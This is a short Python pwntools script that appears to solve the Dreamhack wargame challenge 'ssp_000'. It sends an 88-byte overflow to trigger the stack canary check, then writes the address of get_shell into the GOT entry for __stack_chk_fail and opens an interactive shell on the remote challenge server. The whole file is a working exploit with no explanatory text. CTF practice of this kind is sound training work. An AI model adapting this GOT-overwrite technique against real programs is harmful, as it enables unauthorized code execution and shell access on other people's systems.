from pwn import *

p=remote('host3.dreamhack.games', 15739)

e = ELF('./ssp_000')

get_shell = e.symbols['get_shell']
canary = e.got['__stack_chk_fail']

payload = "a"*88

p.send(payload)

p.sendlineafter('Addr : ', str(canary))

p.sendlineafter('Value : ', str(get_shell))

p.interactive()
